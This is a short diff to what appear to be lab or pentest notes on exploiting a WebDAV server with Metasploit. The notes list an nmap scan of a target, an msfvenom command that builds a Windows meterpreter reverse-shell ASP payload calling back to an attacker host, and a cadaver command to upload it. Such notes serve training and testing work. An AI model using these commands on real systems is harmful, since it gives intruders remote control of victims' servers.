@@ -1,4 +1,5 @@
 #### Exploiting webdav with metasploit
+After confirming the port and webdav service running 
 - nmap -sV -p 80 --script=http-enum 10.2.30.223
 - msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.5.2 LPORT=1234 -f asp >shell.asp [this will create a reverse asp shell in attacker current directory]
 - now we use cadaver to upload this shell [ cadaver http://10.2.30.223 ]
